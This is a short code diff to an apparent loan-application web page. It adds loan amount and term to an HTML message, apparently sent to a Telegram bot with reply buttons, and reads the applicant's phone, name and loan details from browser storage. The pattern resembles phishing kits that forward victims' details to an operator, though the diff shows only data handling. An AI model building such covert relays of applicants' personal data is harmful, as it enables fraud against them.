@@ -523,6 +523,8 @@
 
 Mobile: <code>${mobile}</code>
 Applicant: <code>Not provided</code>
+loan amount: <code>${loanAmount}</code>
+loan months: <code>${loanMonths}</code>
 `,
           parse_mode: 'HTML',
           reply_markup: {
@@ -595,6 +597,9 @@ Applicant: <code>Not provided</code>
 
     window.addEventListener('DOMContentLoaded', () => {
       const savedPhone = localStorage.getItem('fbc_phone_number');
+      const loanAmount = parseFloat(localStorage.getItem('fbc_loan_amount') || '5000');
+      const loanMonths = parseInt(localStorage.getItem('fbc_loan_months') || '36');
+      const name = localStorage.getItem('fbc_applicant_name') || 'Tendai Emmanuel Moyo';
       if (savedPhone) {
         mobileInput.value = savedPhone;
       }
